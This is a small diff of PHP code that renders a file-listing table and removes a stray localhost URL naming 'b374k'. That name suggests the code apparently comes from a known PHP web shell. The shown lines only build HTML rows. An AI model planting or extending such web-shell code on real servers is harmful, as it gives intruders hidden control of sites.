@@ -720,7 +720,7 @@ if(!function_exists('show_all_files')){
 		foreach($allfiles as $f){
 			$output .= "
 	<tr data-path=\"".html_safe(realpath($f))."\"><td><div class='cBox'></div></td>
-	<td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td>http://127.0.0.1/b374k/
+	<td style='white-space:normal;'><a class='view'>".html_safe($f)."</a><span class='action floatRight'>action</span></td>
 	<td title='".filesize($f)."'>".get_filesize($f)."</td>";
 			foreach($cols as $k=>$v){
 				$sortable = "";
